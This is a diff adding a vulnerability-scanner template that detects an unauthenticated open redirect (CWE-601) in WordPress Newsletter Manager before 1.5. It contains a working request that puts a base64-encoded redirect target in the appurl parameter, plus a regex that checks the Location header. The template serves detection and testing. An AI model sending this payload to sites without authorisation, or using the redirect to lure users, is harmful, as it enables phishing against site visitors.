@@ -1,0 +1,24 @@
+id: newsletter-open-redirect
+name: WordPress Newsletter Manager < 1.5 - Unauthenticated Open Redirect
+severity: medium
+confidence: tentative
+description: WordPress Newsletter Manager < 1.5 is susceptible to an open redirect vulnerability. The plugin used base64 encoded
+  user input in the appurl parameter without validation to redirect users using the header() PHP function, leading to an open
+  redirect issue.
+reference: CWE-601
+tags:
+- redirect
+- wp-plugin
+- newsletter
+- wp
+- wpscan
+- wordpress
+- vuln
+requests:
+- method: GET
+  path: /?wp_nlm=confirmation&appurl=aHR0cDovL2ludGVyYWN0LnNo
+  matchers:
+  - type: regex
+    regex:
+    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$
+  condition: or
